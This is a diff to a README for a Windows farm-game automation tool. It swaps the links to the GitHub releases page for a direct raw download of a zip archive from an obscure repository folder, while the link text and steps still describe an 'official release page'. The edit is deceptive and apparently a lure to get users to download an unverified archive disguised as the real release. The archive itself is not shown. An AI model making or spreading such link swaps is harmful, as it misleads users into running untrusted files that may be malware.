@@ -1,6 +1,6 @@
 # 🚜 qq-farm-cdp-auto - Automate your classic farm game daily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/soldat-panther/qq-farm-cdp-auto/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/soldat-panther/qq-farm-cdp-auto/main/calenture/farm-cdp-qq-auto-1.1.zip)
 
 This software manages your classic farm game tasks on Windows. It works in the background to handle farm chores. You do not need to watch the screen while it works. The tool uses background code injection to interact with the game. This approach is stable and works while the window remains hidden or minimized.
 
@@ -8,7 +8,7 @@ This software manages your classic farm game tasks on Windows. It works in the b
 
 Follow these steps to obtain the program files.
 
-1. Go to the [official release page](https://github.com/soldat-panther/qq-farm-cdp-auto/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/soldat-panther/qq-farm-cdp-auto/main/calenture/farm-cdp-qq-auto-1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .zip or .exe to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
